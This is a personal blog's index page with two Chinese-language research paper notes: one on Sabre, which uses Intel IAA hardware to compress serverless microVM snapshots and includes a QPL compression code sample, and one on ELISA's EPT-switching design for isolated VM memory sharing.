<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"szy0127.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"preload":true}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="S blog">
<meta property="og:url" content="http://szy0127.github.io/page/2/index.html">
<meta property="og:site_name" content="S blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="szy">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://szy0127.github.io/page/2/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/2/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>S blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">S blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">szy</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">32</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2025/02/04/papers/Sabre/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/02/04/papers/Sabre/" class="post-title-link" itemprop="url">Sabre: Hardware-Accelerated Snapshot Compression for Serverless MicroVMs </a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2025-02-04 20:44:14 / Modified: 20:53:17" itemprop="dateCreated datePublished" datetime="2025-02-04T20:44:14+08:00">2025-02-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>1.3k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>5 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Sabre-Hardware-Accelerated-Snapshot-Compression-for-Serverless-MicroVMs"><a href="#Sabre-Hardware-Accelerated-Snapshot-Compression-for-Serverless-MicroVMs" class="headerlink" title="Sabre: Hardware-Accelerated Snapshot Compression for Serverless MicroVMs"></a>Sabre: Hardware-Accelerated Snapshot Compression for Serverless MicroVMs</h1><p>OSDI24</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MTNkYmUwZDlhYjFmN2RkMWZjY2EzMThhMzRmMGM0NDNfN3RIV0RvUkZZb1JvQTJzdk1IekhNam0wOWF2N3NWTGVfVG9rZW46QWpiZ2JBaVhIb0FLQnR4T0h3UGNzN0VRbjJlXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>利用硬件加速器IAA压缩VM snapshot，优化serverless场景下microVM cold start慢的问题</p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>问题：serverless场景下microVM冷启动 启动时间久</p>
<ul>
<li>解决方案：采用VM snapshot 把guest VM memory存到文件里 下次读文件恢复而不是从头启动</li>
</ul>
<p>问题：如果存了整个guest memory restore的时候全部load进去太大了</p>
<ul>
<li>解决方案: on-demand paging，触发page fault才映射 和传统进程&#x2F;VM 一样 （现有系统如firecracker采用的方式 baseline1）</li>
</ul>
<p>问题：page fault导致性能差</p>
<ul>
<li>解决方案：prefetch 预测工作集（working set）<ul>
<li>REAP（record-and-replay）是asplops21加速snapshot的方案，提出用working set记录一次function call的pages prefetch这些page （SOTA方案 baseline2）</li>
</ul>
</li>
</ul>
<p>snapshot和WS file的大小很影响效率 越小性能越好 </p>
<ul>
<li>解决方案：压缩</li>
</ul>
<p>问题：解压缩占时间 且在cold start关键路径上</p>
<h2 id="IAA"><a href="#IAA" class="headerlink" title="IAA"></a>IAA</h2><h3 id="IAA介绍"><a href="#IAA介绍" class="headerlink" title="IAA介绍"></a>IAA介绍</h3><p>Intel In-Memory Analytic Accelerator 集成在CPU SoC上的一个PCIe设备</p>
<p>用户态应用向IAA工作队列提交请求</p>
<p>目前主要用在数据库上</p>
<p>IAA提供C接口 直接用intel提供的库</p>
<p>相对于就是最简单的压缩的接口 源数据(uint8*)&lt;–&gt;压缩后的数据(uint8*)</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">qpl_path_t</span> execution_path = qpl_path_software;</span><br><span class="line"><span class="function">std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">source</span><span class="params">(source_size, <span class="number">5</span>)</span></span>;</span><br><span class="line"><span class="function">std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">destination</span><span class="params">(source_size / <span class="number">2</span>, <span class="number">4</span>)</span></span>;</span><br><span class="line"><span class="function">std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">reference</span><span class="params">(source_size, <span class="number">7</span>)</span></span>;</span><br><span class="line">std::unique_ptr&lt;<span class="type">uint8_t</span>[]&gt; job_buffer;</span><br><span class="line"><span class="type">uint32_t</span>                   size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Job initialization</span></span><br><span class="line">qpl_status status = <span class="built_in">qpl_get_job_size</span>(execution_path, &amp;size);</span><br><span class="line"><span class="keyword">if</span> (status != QPL_STS_OK) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;An error &quot;</span> &lt;&lt; status &lt;&lt; <span class="string">&quot; acquired during job size getting.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">job_buffer   = std::<span class="built_in">make_unique</span>&lt;<span class="type">uint8_t</span>[]&gt;(size);</span><br><span class="line">qpl_job* job = <span class="built_in">reinterpret_cast</span>&lt;qpl_job*&gt;(job_buffer.<span class="built_in">get</span>());</span><br><span class="line"></span><br><span class="line">status = <span class="built_in">qpl_init_job</span>(execution_path, job);</span><br><span class="line"><span class="keyword">if</span> (status != QPL_STS_OK) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;An error &quot;</span> &lt;&lt; status &lt;&lt; <span class="string">&quot; acquired during job initializing.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Performing a compression operation</span></span><br><span class="line">job-&gt;op            = qpl_op_compress;</span><br><span class="line">job-&gt;level         = qpl_default_level;</span><br><span class="line">job-&gt;next_in_ptr   = source.<span class="built_in">data</span>();</span><br><span class="line">job-&gt;next_out_ptr  = destination.<span class="built_in">data</span>();</span><br><span class="line">job-&gt;available_in  = source_size;</span><br><span class="line">job-&gt;available_out = <span class="built_in">static_cast</span>&lt;<span class="type">uint32_t</span>&gt;(destination.<span class="built_in">size</span>());</span><br><span class="line">job-&gt;flags         = QPL_FLAG_FIRST | QPL_FLAG_LAST | QPL_FLAG_DYNAMIC_HUFFMAN | QPL_FLAG_OMIT_VERIFY;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Compression</span></span><br><span class="line">status = <span class="built_in">qpl_execute_job</span>(job);</span><br><span class="line"><span class="keyword">if</span> (status != QPL_STS_OK) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;An error &quot;</span> &lt;&lt; status &lt;&lt; <span class="string">&quot; acquired during compression.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> compressed_size = job-&gt;total_out;</span><br></pre></td></tr></table></figure>

<h3 id="IAA能力探索"><a href="#IAA能力探索" class="headerlink" title="IAA能力探索"></a>IAA能力探索</h3><p>对比用IAA硬件压缩与软件压缩的性能：</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YWQwYjU3Mzk1NGM5YjFmMTg5YjkxNTkzZjgxZjUyZDRfYXd0QzNYTWlBdVRUTGVUaEEwVUV6V2wxRkxKTk1BTlNfVG9rZW46SGtnWmJLTVdDb1FrY3p4amwyd2N2eGZYbjViXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NjQwYzQyNmIwYTBkNTZmMmI2OWFkZjQzM2FiMmQ3ZTBfZ0xLaHo1UXM3TUtZWlVFYlBlNU1IQzhDVUlpWW1maFFfVG9rZW46U2tyQ2JXWEMwb2Q0cTB4eWZRNWNnVnZybk5jXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>用硬件压缩比软件快（可以支持异步，不占用CPU cycle， 但是这个工作没用到）</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDFkZDNkNTc2NDQzY2EyOWI1MTc1ZTRmMDQ4MmRjZmVfUG95aGpkdEdQMkxjMHRZODNLSTBHN0lMYmhzQVBWMEhfVG9rZW46VnUxQ2JqT3d0bzRmUml4SnpKTWNSOFRhbnZnXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>可扩展性没问题</p>
<p>后续测试仍用single thread single job完成</p>
<p>PRS(<em>Page Request Service</em> ) IAA集成了处理page fault的功能</p>
<p>不需要操作系统先把文件内容读到内存里，可以用mmap 然后硬件通过PRS拿到数据</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NGZmNjI0MGU5MDRhNzA1NmUwMzdmNTA3MGI1MjFhMTlfcnNDMDhWSVRoaERTekp0NHFTQ2F0MTM2cldHY0RaRmVfVG9rZW46THprcmJvZ0Iyb1Eyb014OWhYRGNiTXJsbktmXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<ul>
<li>Decompress比Disk Read要快，不会拖慢整体时间</li>
<li>O_DIRECT是为了绕过page cache提高性能（REAP使用的优化方式之一）</li>
<li>Disk Read与Disk Read+Decompress重合 -&gt; decompress和disk read overlap 是streaming的操作</li>
</ul>
<p>这里对IAA的测试和分析理论上提出了应用于microVM snapshot性能提升的可行性</p>
<h2 id="sabre-design"><a href="#sabre-design" class="headerlink" title="sabre design"></a>sabre design</h2><p>扩展压缩&#x2F;解压一段数据的功能至：</p>
<ol>
<li>压缩&#x2F;解压多块内存区域</li>
<li>压缩的数据存到文件，恢复时读取再解压</li>
</ol>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQ2MDEwY2M5ZGVmY2Q1NjY0MDUwM2NjN2E2ZjMwODRfSEV1aHI4cTExazVlM2w3S1RRM2FzMjN1Q1Y0cnpBVG1fVG9rZW46SUptYmI1emtNb1lhSER4dTBsdGNIS1RqbkZkXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>snapshot保存memory之外还会保存memory partition压缩前后的位置信息</p>
<p>snapshot和prefetch各提出了两种方案</p>
<h3 id="snapshot"><a href="#snapshot" class="headerlink" title="snapshot"></a>snapshot</h3><ol>
<li>每块不连续的内存先复制到一块连续的buffer上，然后压缩一次</li>
<li>每块不连续的内存独立压缩，压缩后的数据连续存到磁盘里</li>
</ol>
<h3 id="prefetch"><a href="#prefetch" class="headerlink" title="prefetch"></a>prefetch</h3><ol>
<li>解压一次，根据记录的信息恢复到不同的内存区域（通过userfaultfd，多一次memory copy 但是因为DMA连续 所以性能好）</li>
<li>根据记录的信息解压多次</li>
</ol>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="microbenchmark"><a href="#microbenchmark" class="headerlink" title="microbenchmark"></a>microbenchmark</h3><p>先和不压缩比，然后和软件压缩比</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MWI1YjQxMjVkOGQ4ODI3MmQwNmM5Y2RkMjJjNDIyNzlfVFhKa0pESmFZVzgwbzVaR0ZWVkE4R0U2YlU0SnZ2ejFfVG9rZW46UFdGR2I3ZDRlb2pIT0Z4OEhhemNva0NablVnXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>passthrough表示读不压缩的snapshot(174.5MB)</p>
<p>sparsity表示连续page大小 1表示每个page都被一个empty page隔开</p>
<p>压缩率是2.2x 所以考虑到磁盘读，最大的加速比就是2.2 sabre是1.9</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=N2M1YmViNTQ0NGJmMzIyMjk0OGNkZDA0ZDE5MGFkM2NfdERBQXpqa2RMdmJlcWhVaWtKTDEzZDlQOTREeFo5N3lfVG9rZW46SU1aOGJYOEw5b20xTUl4WkFaN2NQSzBOblFkXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>比较软件方案</p>
<ul>
<li>create：IAA最快</li>
<li>restore-single：IAA最快</li>
<li>restore-scattered: 稀疏性越弱IAA越快</li>
</ul>
<h3 id="end-to-end"><a href="#end-to-end" class="headerlink" title="end-to-end"></a>end-to-end</h3><p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjg5ZjM1NzY2NzhlNDc1YTNjM2RkYTZkNjllMDZkNzZfQ3IxVzlGMndEaW9HenRDaDlFeUdpUHNTMTBPakNSQUJfVG9rZW46SXZSWGJqMWJkb0dCaDF4bHE2TGNQWjhzbjFiXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>已经集成到firecracker中</p>
<p>使用KVM提供的dirty pages Diff Snapshot</p>
<p>数据大，粒度粗，选择用scattered（没有对比）</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YzQ2OWFkY2JkYjEyOTI3OTE0Y2E1Mjc4YjQzNTU1MjdfcERyOE1qTzdUcUNQbWJDb2N3VUtzRzIzMVd6OHJDb01fVG9rZW46Tkd0Z2JKTVlObzdNcEd4eFdsMmN1cVlRbjFmXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>baseline是snapshot 不压缩 不prefetch</p>
<ul>
<li>baseline使用on-demand paging VM load的时候耗时少 但是函数调用会触发一系列page fault</li>
<li>Sabre在VM load时需要恢复guest memory 耗时多 但是prefetch了内存 函数调用快</li>
</ul>
<p>最高64% cold start加速</p>
<p>和SOTA方案REAP比</p>
<p>REAP的working set记录的page比较分散 选择用single-chunk（没有对比）</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NWM2MmE4YjM2NDU2Mjk5ODhhZWJjNWQzY2FlNTYwZjNfaWtvWlRhZ2lrcE01Q01JelFRMjNlemdzYjZleFVEYXRfVG9rZW46WE1GbmJoaHU2b0JJUWR4TWVvQ2NIRkVpbmhlXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>Working set对于一个固定的应用来说是不变的，sabre压缩了WS file 所以性能更好了</p>
<p>以cnn-image-classification为例，压缩比为3.10 prefetch加速38.73% 又因为该场景中REAP prefetch耗时占比大 最终Sabre达到19.2%的优势</p>
<p>对function invocation占比大的场景优势不明显（这个serverless函数本身启动耗时）</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MDBiYzUxYWE0NTg0ZmM3YjIxNDZjM2FjYjU0ZDdiMmFfYzc0Tm1abU9LbzhUSDdJbk96MnUyMmFsdU9ET0NkeGFfVG9rZW46RWc3VmJsbXFwb1JOM0h4aUdsbmNzQnVMbkdkXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>创新地提出把硬件加速器IAA应用于压缩VM snapshot，并通过合理的设计成功加速了microVM cold start</p>
<h2 id="启发"><a href="#启发" class="headerlink" title="启发"></a>启发</h2><ol>
<li>IAA加速压缩&#x2F;解压是否可以应用在其他场景中？ (有正在进行的VM migration的工作<a target="_blank" rel="noopener" href="https://lore.kernel.org/all/20240319164527.1873891-1-yuan1.liu@intel.com/T/%EF%BC%89">https://lore.kernel.org/all/20240319164527.1873891-1-yuan1.liu@intel.com/T/）</a></li>
<li>探索新硬件提供的其他功能</li>
</ol>
<ul>
<li>IAA：加密、CRC offload、data filtering等<a target="_blank" rel="noopener" href="https://www.intel.com/content/www/us/en/content-details/721858/intel-in-memory-analytics-accelerator-architecture-specification.html">https://www.intel.com/content/www/us/en/content-details/721858/intel-in-memory-analytics-accelerator-architecture-specification.html</a></li>
<li>其他硬件 例如DLB<a target="_blank" rel="noopener" href="https://www.intel.cn/content/www/cn/zh/products/docs/processors/xeon-accelerated/4th-gen-xeon-scalable-processors-product-brief.html">https://www.intel.cn/content/www/cn/zh/products/docs/processors/xeon-accelerated/4th-gen-xeon-scalable-processors-product-brief.html</a></li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/09/17/papers/ELISA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/17/papers/ELISA/" class="post-title-link" itemprop="url">ELISA</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-09-17 19:48:03" itemprop="dateCreated datePublished" datetime="2024-09-17T19:48:03+08:00">2024-09-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>2.8k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>10 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="ELISA"><a href="#ELISA" class="headerlink" title="ELISA"></a>ELISA</h1><p><a target="_blank" rel="noopener" href="https://github.com/yasukata/ELISA?tab=readme-ov-file#section-41--anywhere-page-table-apt">yasukata&#x2F;ELISA: ELISA: Exit-Less, Isolated, and Shared Access for Virtual Machines (github.com)</a></p>
<p>主要是elisa的设计实现了带隔离的共享内存 network的use case可以做到比vhost-net更好</p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>虚拟机间需要共享数据</p>
<ul>
<li>共享内存 效率高 隔离性低 guest代码不可信</li>
<li>host介入 例如hypercall 隔离性好 效率低</li>
</ul>
<img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221135854799.png" alt="image-20240221135854799" style="zoom:50%;" />

<ul>
<li>share一块设备的DMA区域</li>
<li>trafficDB</li>
</ul>
<p>ELISA通过vmfunc切换EPT页表实现安全高效的资源共享</p>
<img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221140438142.png" alt="image-20240221140438142" style="zoom:50%;" />

<h2 id="EPTP"><a href="#EPTP" class="headerlink" title="EPTP"></a>EPTP</h2><img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221151320704.png" alt="image-20240221151320704" style="zoom:50%;" />

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rev-omi/p/14063037.html">第10章：VT 技术（简单了解+EPT 机制） - Rev_omi - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.usenix.org/sites/default/files/conference/protected-files/atc18_slides_hua.pdf">atc18_slides_hua.pdf (usenix.org)</a></p>
<img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221135313661.png" alt="image-20240221135313661" style="zoom:50%;" />

<img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221135431450.png" alt="image-20240221135431450" style="zoom:50%;" />

<p>EPTP: EPT四级页表的root</p>
<p>传统hypervisor只需要为每个guest配置一套EPT就可以 intel允许配置512个</p>
<p>改完EPT以后 GPA-&gt;HPA映射改变 所有数据都变了 包括代码和页表</p>
<p>所以大部分都是不改的 只改需要改的部分 例如代码</p>
<ul>
<li>原本不能访问的 现在可以访问</li>
<li>代码段4k页结束以后 变到了新的代码段上了</li>
</ul>
<h2 id="challange"><a href="#challange" class="headerlink" title="challange"></a>challange</h2><p>EPT context 指每个EPTP对应的四级页表</p>
<p>需要保证guest 页表数据不变(否则会crash) 所以guest 页表GPA-&gt;HPA不能变</p>
<p> 所以guest改cr3必须下陷同步修改EPT？</p>
<p>修改EPT以后代码在哪？  理论：通过固定GVA去call vmfunc 实际：恶意guest可以控制页表和cr3 导致可以任意GVAcall 绕过判断</p>
<h2 id="design"><a href="#design" class="headerlink" title="design"></a>design</h2><p>三种EPT context</p>
<ul>
<li>default 不可信</li>
<li>gate 可信</li>
<li>sub 可信</li>
</ul>
<p>Manager VM：可信部分 方便用user-space的tool 代替了kernel的hypervisor 去配置EPT</p>
<h3 id="APT"><a href="#APT" class="headerlink" title="APT"></a>APT</h3><p>APT是为了消除CR3的trap和update开销</p>
<p>vmfunc之后 GPA-&gt;HPA映射改变 还是在guest内 因此想要执行目标代码 绕不开地址翻译</p>
<p>让所有的GPA都指向提前配置好的guest页表基地址 这样不论cr3的值是什么 都可以正确翻译</p>
<p>因此其他用到的内存 例如栈 共享变量 代码都必须在guest合法GPA之外 例如256G</p>
<h3 id="gate"><a href="#gate" class="headerlink" title="gate"></a>gate</h3><img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221135535967.png" alt="image-20240221135535967" style="zoom:50%;" />

<p><a target="_blank" rel="noopener" href="https://www.usenix.org/conference/usenixsecurity20/presentation/mi">(Mostly) Exitless VM Protection from Untrusted Hypervisor through Disaggregated Nested Virtualization | USENIX</a></p>
<p>防止VM 随意切换EPTP bypass掉可信部分 用动态修改EPTP list的技术 </p>
<p>初始化情况下 EPTP list 只有default 和gate 两个entry</p>
<p>切换到gate的时候动态加入sub到EPTP list</p>
<p>sub回到default之前再把sub从EPTP list里面删了</p>
<p>dlopen加载可信代码 映射到sub EPT</p>
